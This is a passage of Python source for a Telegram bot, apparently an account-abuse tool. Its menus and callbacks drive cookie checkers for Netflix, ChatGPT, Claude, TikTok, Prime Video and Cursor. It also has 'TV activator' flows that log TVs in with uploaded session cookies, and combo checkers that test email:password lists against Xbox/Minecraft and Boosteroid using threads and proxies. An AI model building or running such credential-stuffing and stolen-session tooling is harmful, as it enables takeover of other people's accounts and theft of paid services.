                                  caption=f"{E_FIRE} {bold('Current Hits')} ({len(cs.stats.all_hits)} total)\n{E_GEAR} {italic('Dev: @ADI_WT')}",
                                  parse_mode="HTML", reply_to_message_id=call.message.message_id)
            except:
                pass
        else:
            if hits_text == "No hits found yet.":
                _answer(bot, call.id, "No hits found yet!", alert=True)
                return
            bot.send_message(call.message.chat.id,
                             f"{E_FIRE} {bold('Current Hits:')}\n\n{pre(hits_text)}\n\n{E_GEAR} {italic('Dev: @ADI_WT')}",
                             parse_mode="HTML", reply_to_message_id=call.message.message_id)
        _answer(bot, call.id)

    @bot.callback_query_handler(func=lambda call: call.data.startswith("stop_check_"))
    def cb_stop_check(call):
        user = call.from_user
        uid = int(call.data.split("_")[-1])
        if user.id != uid:
            _answer(bot, call.id, "Not your check!", alert=True)
            return

        with state.active_checks_lock:
            cs = state.active_checks.get(uid)

        if not cs:
            _answer(bot, call.id, "No active check found!", alert=True)
            return

        cs.stop_event.set()
        # Cancel all pending futures and shut down executor immediately
        if cs.executor:
            try:
                for fut in getattr(cs, 'futures', []):
                    fut.cancel()
                cs.executor.shutdown(wait=False, cancel_futures=True)
            except TypeError:
                cs.executor.shutdown(wait=False)
            except Exception:
                pass
        _answer(bot, call.id, "⛔ Stopped instantly!")

    @bot.message_handler(commands=['stop'])
    def cmd_stop(message):
        user = message.from_user
        uid = user.id
        db_inst = load_db()
        banned, reason = is_banned(db_inst, uid)
        if banned:
            bot.reply_to(message, f"{E_BAN} {bold('You are banned!')}\n{E_MEMO} Reason: {mono(reason)}", parse_mode="HTML")
            return

        def _kill_executor(cs):
            """Instantly cancel all pending futures and shut down executor."""
            cs.stop_event.set()
            if cs.executor:
                try:
                    for fut in getattr(cs, 'futures', []):
                        fut.cancel()
                    cs.executor.shutdown(wait=False, cancel_futures=True)
                except TypeError:
                    cs.executor.shutdown(wait=False)
                except Exception:
                    pass

        stopped_count = 0
        with state.active_checks_lock:
            pending_key = f"pending_{uid}"
            if pending_key in state.active_checks:
                del state.active_checks[pending_key]
                stopped_count += 1
            if uid in state.active_checks:
                _kill_executor(state.active_checks[uid])
                stopped_count += 1
            ck_pending_key = f"ck_pending_{uid}"
            if ck_pending_key in state.active_checks:
                del state.active_checks[ck_pending_key]
                stopped_count += 1
            ck_key = f"ck_{uid}"
            if ck_key in state.active_checks:
                _kill_executor(state.active_checks[ck_key])
                stopped_count += 1
            ib_pending_key = f"ib_pending_{uid}"
            if ib_pending_key in state.active_checks:
                del state.active_checks[ib_pending_key]
                stopped_count += 1
            ib_key = f"ib_{uid}"
            if ib_key in state.active_checks:
                _kill_executor(state.active_checks[ib_key])
                stopped_count += 1
            file_key = f"file_{uid}"
            if file_key in state.active_checks:
                del state.active_checks[file_key]

        if stopped_count > 0:
            bot.reply_to(message, f"{E_STOP} {bold('All active checks stopped!')}\n{E_GEAR} {italic('Dev: @ADI_WT')}", parse_mode="HTML")
        else:
            bot.reply_to(message, f"{E_WARN} {bold('No active check found!')}\n{E_GEAR} {italic('Dev: @ADI_WT')}", parse_mode="HTML")


    # ═══════════════════════════════════════════════════════════════════════════
    #  MAIN MENU CALLBACKS
    # ═══════════════════════════════════════════════════════════════════════════

    @bot.callback_query_handler(func=lambda call: call.data == "open_checker")
    def cb_open_checker(call):
        uid = call.from_user.id
        chat_id = call.message.chat.id

        checker_text = f"""{E_SEARCH} <b>🍪 Cookie Checker</b>

Select a service to check cookies:

🎬 <b>Netflix</b> — Netflix account checker
🤖 <b>ChatGPT</b> — OpenAI account checker
🎵 <b>TikTok</b> — TikTok account checker
🎬 <b>Prime Video</b> — Amazon Prime checker
🤖 <b>Claude</b> — Anthropic Claude checker
💻 <b>Cursor</b> — Cursor AI checker

{E_INFO} Upload .txt/.json/.zip files with cookies"""

        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("🎬 Netflix", callback_data=f"ck_svc_netflix_{uid}"),
            types.InlineKeyboardButton("🤖 ChatGPT", callback_data=f"ck_svc_chatgpt_{uid}"),
        )
        markup.add(
            types.InlineKeyboardButton("🎵 TikTok", callback_data=f"ck_svc_tiktok_{uid}"),
            types.InlineKeyboardButton("🎬 Prime Video", callback_data=f"ck_svc_primevideo_{uid}"),
        )
        markup.add(
            types.InlineKeyboardButton("🤖 Claude", callback_data=f"ck_svc_claude_{uid}"),
            types.InlineKeyboardButton("💻 Cursor", callback_data=f"ck_svc_cursor_{uid}"),
        )
        markup.add(
            types.InlineKeyboardButton("◀️ Back", callback_data="back_to_menu"),
        )

        try:
            bot.edit_message_text(checker_text, chat_id=chat_id,
                                  message_id=call.message.message_id,
                                  parse_mode="HTML", reply_markup=markup)
        except:
            bot.send_message(chat_id, checker_text, parse_mode="HTML", reply_markup=markup)
        bot.answer_callback_query(call.id)

    @bot.callback_query_handler(func=lambda call: call.data == "back_to_menu")
    def cb_back_to_menu(call):
        from COMMANDS.START.start import start_command
        start_command(call.message)
        bot.answer_callback_query(call.id)

    # ═══════════════════════════════════════════════════════════════════════════
    #  TV MENU CALLBACKS
    # ═══════════════════════════════════════════════════════════════════════════

    @bot.callback_query_handler(func=lambda call: call.data == "tv_menu")
    def cb_tv_menu(call):
        uid = call.from_user.id
        chat_id = call.message.chat.id

        tv_text = f"""{E_TV} <b>📺 TV Activator Menu</b>

Select a TV service to activate:

🎬 <b>Netflix</b> — /nflogin YOUR_CODE
📺 <b>JioHotstar</b> — Reply to QR with /jhtv
🎵 <b>Spotify</b> — /spotifytv YOUR_CODE
🎬 <b>Prime Video</b> — /pvtv YOUR_CODE

{E_INFO} Put cookies in respective folders:
   • nf_cookies/ — Netflix
   • jh_cookies/ — JioHotstar
   • spotify_cookies/ — Spotify
   • pv_cookies/ — Prime Video"""

        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("🎬 Netflix", callback_data="tv_netflix"),
            types.InlineKeyboardButton("📺 JioHotstar", callback_data="tv_jiohotstar"),
        )
        markup.add(
            types.InlineKeyboardButton("🎵 Spotify", callback_data="tv_spotify"),
            types.InlineKeyboardButton("🎬 Prime Video", callback_data="tv_primevideo"),
        )
        markup.add(
            types.InlineKeyboardButton("📤 Netflix Cookies", callback_data=f"tv_up_nf_cookies_{uid}"),
            types.InlineKeyboardButton("📤 Hotstar Cookies", callback_data=f"tv_up_jh_cookies_{uid}"),
        )
        markup.add(
            types.InlineKeyboardButton("📤 Spotify Cookies", callback_data=f"tv_up_sp_cookies_{uid}"),
            types.InlineKeyboardButton("📤 Prime Cookies",   callback_data=f"tv_up_pv_cookies_{uid}"),
        )
        markup.add(
            types.InlineKeyboardButton("◀️ Back", callback_data="tv_back"),
        )

        try:
            bot.edit_message_text(tv_text, chat_id=chat_id,
                                  message_id=call.message.message_id,
                                  parse_mode="HTML", reply_markup=markup)
        except:
            bot.send_message(chat_id, tv_text, parse_mode="HTML", reply_markup=markup)
        bot.answer_callback_query(call.id)


    @bot.callback_query_handler(func=lambda call: call.data == "tv_netflix")
    def cb_tv_netflix(call):
        uid = call.from_user.id
        chat_id = call.message.chat.id

        nf_text = f"""{E_TV} <b>🎬 Netflix TV Activator</b>

<b>How to use:</b>
1️⃣ Open Netflix on your TV
2️⃣ Get the 8-digit code from screen
3️⃣ Send: <code>/nflogin YOUR_CODE</code>

{E_INFO} Put cookies in <code>nf_cookies/</code> folder
{E_INFO} Only premium accounts will activate TV"""

        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("◀️ Back to TV Menu", callback_data="tv_menu"))

        try:
            bot.edit_message_text(nf_text, chat_id=chat_id,
                                  message_id=call.message.message_id,
                                  parse_mode="HTML", reply_markup=markup)
        except:
            bot.send_message(chat_id, nf_text, parse_mode="HTML", reply_markup=markup)
        bot.answer_callback_query(call.id)

    @bot.callback_query_handler(func=lambda call: call.data == "tv_back")
    def cb_tv_back(call):
        cb_mode_main(call)

    @bot.callback_query_handler(func=lambda call: call.data == "tv_jiohotstar")
    def cb_tv_jiohotstar(call):
        uid = call.from_user.id
        chat_id = call.message.chat.id

        jh_text = f"""{E_TV} <b>📺 JioHotstar TV Activator</b>

<b>How to use:</b>
1️⃣ Open JioHotstar on your TV
2️⃣ Get the QR code from TV screen
3️⃣ Send QR code <b>IMAGE</b> to this bot
4️⃣ Reply to that image with: <code>/jhtv</code>

✅ Bot will scan QR → Find cookie → Activate TV

{E_INFO} Put cookies in <code>jh_cookies/</code> folder
{E_INFO} Max 3 uses per cookie"""

        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("◀️ Back to TV Menu", callback_data="tv_menu"))

        try:
            bot.edit_message_text(jh_text, chat_id=chat_id,
                                  message_id=call.message.message_id,
                                  parse_mode="HTML", reply_markup=markup)
        except:
            bot.send_message(chat_id, jh_text, parse_mode="HTML", reply_markup=markup)
        bot.answer_callback_query(call.id)

    @bot.callback_query_handler(func=lambda call: call.data == "tv_spotify")
    def cb_tv_spotify(call):
        uid = call.from_user.id
        chat_id = call.message.chat.id

        sp_text = f"""{E_TV} <b>🎵 Spotify TV Activator</b>

1. Open Spotify on your TV
2. Get the 6-digit code from screen
3. Send: <code>/spotifytv YOUR_CODE</code>

{E_INFO} Put cookies in <code>spotify_cookies/</code> folder"""

        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("◀️ Back to TV Menu", callback_data="tv_menu"))

        try:
            bot.edit_message_text(sp_text, chat_id=chat_id,
                                  message_id=call.message.message_id,
                                  parse_mode="HTML", reply_markup=markup)
        except:
            bot.send_message(chat_id, sp_text, parse_mode="HTML", reply_markup=markup)
        bot.answer_callback_query(call.id)

    @bot.callback_query_handler(func=lambda call: call.data == "tv_primevideo")
    def cb_tv_primevideo(call):
        uid = call.from_user.id
        chat_id = call.message.chat.id

        pv_text = f"""{E_TV} <b>🎬 Prime Video TV Activator</b>

1. Open Prime Video on your TV
2. Get the registration code from screen
3. Send: <code>/pvtv YOUR_CODE</code>

{E_INFO} Put cookies in <code>pv_cookies/</code> folder"""

        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("◀️ Back to TV Menu", callback_data="tv_menu"))

        try:
            bot.edit_message_text(pv_text, chat_id=chat_id,
                                  message_id=call.message.message_id,
                                  parse_mode="HTML", reply_markup=markup)
        except:
            bot.send_message(chat_id, pv_text, parse_mode="HTML", reply_markup=markup)
        bot.answer_callback_query(call.id)



    # ═══════════════════════════════════════════════════════════════════════════
    #  COMBO CHECKER MENU CALLBACKS
    # ═══════════════════════════════════════════════════════════════════════════

    @bot.callback_query_handler(func=lambda call: call.data == "xgp_menu")
    def cb_combo_menu(call):
        uid = call.from_user.id
        chat_id = call.message.chat.id

        combo_text = f"""{E_SEARCH} <b>🎮 Xbox Game Pass Checker</b>

Select a checker:

💎 <b>Xbox Game Pass</b> — Check XGPU/XGP/Minecraft accounts
   Format: email:password
   Detects: Premium, XGP, XGPU, Capes

{E_INFO} Upload .txt file with combos
   (email:password per line)"""

        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("💎 Xbox Game Pass", callback_data="xgp_minecraft"),
            types.InlineKeyboardButton("☁️ Boosteroid", callback_data="xgp_boosteroid"),
        )
        markup.add(
            types.InlineKeyboardButton("◀️ Back", callback_data="xgp_back"),
        )

        try:
            bot.edit_message_text(combo_text, chat_id=chat_id,
                                  message_id=call.message.message_id,
                                  parse_mode="HTML", reply_markup=markup)
        except:
            bot.send_message(chat_id, combo_text, parse_mode="HTML", reply_markup=markup)
        bot.answer_callback_query(call.id)

    @bot.callback_query_handler(func=lambda call: call.data == "xgp_back")
    def cb_combo_back(call):
        cb_mode_main(call)

    @bot.callback_query_handler(func=lambda call: call.data == "xgp_minecraft")
    def cb_combo_minecraft(call):
        uid = call.from_user.id
        chat_id = call.message.chat.id

        with state.active_checks_lock:
            state.active_checks[f"combo_mode_{uid}"] = "minecraft"
        if True:
            pass

        mc_text = f"""{E_SEARCH} <b>💎 Xbox Game Pass Combo Checker</b>

<b>How to use:</b>
1️⃣ Prepare a .txt file with combos
2️⃣ Format: <code>email:password</code> (one per line)
3️⃣ Upload the file to this bot
4️⃣ Bot will check each combo

<b>Detects:</b>
💎 Xbox Game Pass Ultimate (XGPU)
💎 Xbox Game Pass (XGP)
✅ Minecraft Premium + Capes
✅ Valid Xbox Accounts

{E_INFO} File will be processed automatically

📤 <b>Now upload your combo .txt file</b> — checking will start immediately!"""

        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("💎 All Hits", callback_data=f"mcfilter_all_{uid}"),
            types.InlineKeyboardButton("🎮 XGPU/XGP Only", callback_data=f"mcfilter_xgp_{uid}"),
        )
        markup.add(
            types.InlineKeyboardButton("⛏️ Minecraft Premium Only", callback_data=f"mcfilter_mc_{uid}"),
        )
        markup.add(
            types.InlineKeyboardButton("🌐 With Proxies", callback_data=f"mcpx_on_{uid}"),
            types.InlineKeyboardButton("🚫 Proxyless (Direct IP)", callback_data=f"mcpx_off_{uid}"),
        )
        markup.add(
            types.InlineKeyboardButton("⚡ 10 Threads", callback_data=f"mcth_10_{uid}"),
            types.InlineKeyboardButton("⚡ 20 Threads", callback_data=f"mcth_20_{uid}"),
            types.InlineKeyboardButton("⚡ 50 Threads", callback_data=f"mcth_50_{uid}"),
        )
        markup.add(
            types.InlineKeyboardButton("◀️ Back to Xbox Menu", callback_data="xgp_menu"),
        )

        try:
            bot.edit_message_text(mc_text, chat_id=chat_id,
                                  message_id=call.message.message_id,
                                  parse_mode="HTML", reply_markup=markup)
        except:
            bot.send_message(chat_id, mc_text, parse_mode="HTML", reply_markup=markup)
        bot.answer_callback_query(call.id)



    # ── #2 Hit filter select (Minecraft combo) ──────────────────────────────
    @bot.callback_query_handler(func=lambda call: call.data.startswith("mcfilter_"))
    def cb_mcfilter(call):
        parts = call.data.split("_")
        filt, uid = parts[1], int(parts[2])
        if call.from_user.id != uid:
            _answer(bot, call.id, "Not your session!", alert=True)
            return
        with state.active_checks_lock:
            state.active_checks[f"mc_filter_{uid}"] = filt
        labels = {"all": "💎 All Hits", "xgp": "🎮 XGPU/XGP Only", "mc": "⛏️ Minecraft Premium Only"}
        _answer(bot, call.id, f"Filter set: {labels.get(filt, filt)} — now send the file!", alert=True)

    # ── #7 Thread control (Xbox combo) ──
    @bot.callback_query_handler(func=lambda call: call.data.startswith("mcth_"))
    def cb_mcth(call):
        parts = call.data.split("_")
        thr, uid = int(parts[1]), int(parts[2])
        if call.from_user.id != uid:
            _answer(bot, call.id, "Not your session!", alert=True)
            return
        with state.active_checks_lock:
            state.active_checks[f"mc_threads_{uid}"] = thr
        _answer(bot, call.id, f"⚡ Threads set: {thr}", alert=True)

    # ── Proxyless toggle (Xbox combo) ──
    @bot.callback_query_handler(func=lambda call: call.data.startswith("mcpx_"))
    def cb_mcpx(call):
        parts = call.data.split("_")
        mode_px, uid = parts[1], int(parts[2])
        if call.from_user.id != uid:
            _answer(bot, call.id, "Not your session!", alert=True)
            return
        with state.active_checks_lock:
            state.active_checks[f"mc_px_{uid}"] = (mode_px == "on")
        if mode_px == "on":
            _answer(bot, call.id, "🌐 Proxies ON — Microsoft-tested proxies will be used", alert=True)
        else:
            _answer(bot, call.id, "🚫 Proxyless ON — direct host IP se check hoga. Rate-limit ka dhyan rakhna!", alert=True)

    # ── Boosteroid Combo Callback ────────────────────────────────────────────

    # ── TV cookies upload — choose a service, then send a .txt file ────────────
    @bot.callback_query_handler(func=lambda call: call.data.startswith("tv_up_"))
    def cb_tv_upload(call):
        parts = call.data.split("_")
        folder = "_".join(parts[2:-1])  # nf_cookies / jh_cookies / sp_cookies / pv_cookies
        uid = int(parts[-1])
        if call.from_user.id != uid:
            _answer(bot, call.id, "Not your session!", alert=True)
            return
        with state.active_checks_lock:
            state.active_checks[f"tv_up_{uid}"] = folder
        svc_names = {
            "nf_cookies": "🎬 Netflix", "jh_cookies": "📺 JioHotstar",
            "sp_cookies": "🎵 Spotify", "pv_cookies": "🎬 Prime Video",
        }
        _answer(bot, call.id)
        bot.send_message(
            call.message.chat.id,
            f"📤 {bold(svc_names.get(folder, folder) + ' Cookies Upload')}\n\n"
            f"Now send your cookie <b>.txt file</b> (1 file = 1 account).\n"
            f"{E_MEMO} The bot will save it in the <code>{folder}/</code> folder.\n"
            f"{E_INFO} Format: key=value, Netscape or JSON — all supported.",
            parse_mode="HTML"
        )

    # ── TV Login from file-upload menu — choose a service ────────────────
    @bot.callback_query_handler(func=lambda call: call.data.startswith("mode_tvlogin_"))
    def cb_mode_tvlogin(call):
        _answer(bot, call.id)  # instant ack
        try:
            uid = int(call.data.split("_")[-1])
        except Exception:
            return
        if call.from_user.id != uid:
            bot.answer_callback_query(call.id, "Not your session!", show_alert=True)
            return
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("🎬 Netflix", callback_data=f"tvsel_nf_cookies_{uid}"),
            types.InlineKeyboardButton("🎬 Prime Video", callback_data=f"tvsel_pv_cookies_{uid}"),
        )
        markup.add(
            types.InlineKeyboardButton("🎵 Spotify", callback_data=f"tvsel_sp_cookies_{uid}"),
            types.InlineKeyboardButton("📺 JioHotstar", callback_data=f"tvsel_jh_cookies_{uid}"),
        )
        try:
            bot.edit_message_text(
                f"{E_TV} {bold('TV Login — Choose a Service')}\n\n"
                f"{E_MEMO} Your cookie file will be saved in that service's folder,\n"
                f"then send the TV code to complete the login.",
                call.message.chat.id, call.message.message_id,
                parse_mode="HTML", reply_markup=markup
            )
        except Exception:
            bot.send_message(
                call.message.chat.id,
                f"{E_TV} {bold('TV Login — Choose a Service')}\n\n"
                f"{E_MEMO} Your cookie file will be saved in that service's folder,\n"
                f"then send the TV code to complete the login.",
                parse_mode="HTML", reply_markup=markup
            )

    @bot.callback_query_handler(func=lambda call: call.data.startswith("tvsel_"))
    def cb_tvsel(call):
        _answer(bot, call.id)  # instant ack — button kabhi silently hang nahi hoga
        try:
            parts = call.data.split("_")
            folder = "_".join(parts[1:-1])  # pv_cookies etc
            uid = int(parts[-1])
            if call.from_user.id != uid:
                _answer(bot, call.id, "Not your session!", alert=True)
                return
            with state.active_checks_lock:
                fd = state.active_checks.pop(f"file_{uid}", None)
            if not fd:
                bot.answer_callback_query(call.id, "File expired, please upload again!", show_alert=True)
                return
            if fd.get("is_zip"):
                bot.answer_callback_query(call.id, "Only .txt files are supported!", show_alert=True)
                return
            import pathlib
            folder_path = pathlib.Path(folder)
            folder_path.mkdir(exist_ok=True)
            safe_name = os.path.basename(fd["filename"]).replace("/", "_") or "cookies.txt"
            (folder_path / safe_name).write_bytes(fd["content"])
            count = len([f for f in folder_path.iterdir() if f.is_file()])
            cmds = {"nf_cookies": "/nflogin CODE", "pv_cookies": "/pvtv CODE",
                    "sp_cookies": "/spotifytv CODE", "jh_cookies": "/jhtv (QR pe reply)"}
            try:
                bot.edit_message_text(
                    f"{E_CHECK} {bold('Cookies Saved — TV Login Ready!')}\n"
                    f"{E_FILE} File: {mono(safe_name)}\n"
                    f"📁 Folder: {mono(folder + '/')} ({mono(str(count))} files)\n\n"
                    f"📺 Now open the code on your TV and send it:\n"
                    f"{mono(cmds.get(folder, ''))}",
                    call.message.chat.id, call.message.message_id, parse_mode="HTML"
                )
            except Exception:
                # if edit fails, send a new message — user always gets a response
                bot.send_message(
                    call.message.chat.id,
                    f"{E_CHECK} {bold('Cookies Saved — TV Login Ready!')}\n"
                    f"{E_FILE} File: {mono(safe_name)}\n"
                    f"📁 Folder: {mono(folder + '/')} ({mono(str(count))} files)\n\n"
                    f"📺 Now open the code on your TV and send it:\n"
                    f"{mono(cmds.get(folder, ''))}",
                    parse_mode="HTML"
                )
        except Exception as e:
            try:
                bot.answer_callback_query(call.id, f"Error: {str(e)[:120]}", show_alert=True)
            except Exception:
                pass

    # ── Combo mode buttons from file-upload menu ─────────────────────────────
    @bot.callback_query_handler(func=lambda call: call.data.startswith("mode_mccombo_") or call.data.startswith("mode_boostcombo_"))
    def cb_mode_combo(call):
        uid = int(call.data.split("_")[-1])
        if call.from_user.id != uid:
            _answer(bot, call.id, "Not your session!", alert=True)
            return
        mode = "minecraft" if call.data.startswith("mode_mccombo_") else "boosteroid"
        _answer(bot, call.id)
        with state.active_checks_lock:
            fd = state.active_checks.get(f"file_{uid}")
        if not fd:
            _answer(bot, call.id, "File expired, please upload again!", alert=True)
            return
        if fd.get("is_zip"):
            _answer(bot, call.id, "Only .txt files for combos!", alert=True)
            return
        threading.Thread(
            target=_run_combo_check,
            args=(bot, call.from_user, call.message, fd["content"], fd["filename"], mode),
            daemon=True
        ).start()

    # ── Combo stop button ────────────────────────────────────────────────────
    @bot.callback_query_handler(func=lambda call: call.data.startswith("combo_stop_"))
    def cb_combo_stop(call):
        uid = int(call.data.split("_")[-1])
        if call.from_user.id != uid and call.from_user.id != ADMIN_ID:
            _answer(bot, call.id, "Not your session!", alert=True)
            return
        with state.active_checks_lock:
            flag = state.active_checks.get(f"combo_run_{uid}")
        if flag:
            flag.set()
            _answer(bot, call.id, "Stopping...")
        else:
            _answer(bot, call.id, "No active combo check!", alert=True)

    @bot.callback_query_handler(func=lambda call: call.data == "xgp_boosteroid")
    def cb_xgp_boosteroid(call):
        uid = call.from_user.id
        chat_id = call.message.chat.id

        with state.active_checks_lock:
            state.active_checks[f"combo_mode_{uid}"] = "boosteroid"

        boost_text = f"""{E_SEARCH} <b>🎮 Boosteroid Combo Checker</b>

<b>How to use:</b>
1️⃣ Prepare a .txt file with combos
2️⃣ Format: <code>email:password</code> (one per line)
3️⃣ Upload the file to this bot
4️⃣ Bot will check each combo

<b>Detects:</b>
✅ Boosteroid Subscription
✅ Plan type
✅ Games installed count
✅ Account info

{E_INFO} Uses SHA512 PoW login
{E_INFO} File will be processed automatically

📤 <b>Now upload your combo .txt file</b> — checking will start immediately!"""

        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("◀️ Back to Xbox Menu", callback_data="xgp_menu"))

        try:
            bot.edit_message_text(boost_text, chat_id=chat_id,
                                  message_id=call.message.message_id,
                                  parse_mode="HTML", reply_markup=markup)
        except:
            bot.send_message(chat_id, boost_text, parse_mode="HTML", reply_markup=markup)
        bot.answer_callback_query(call.id)

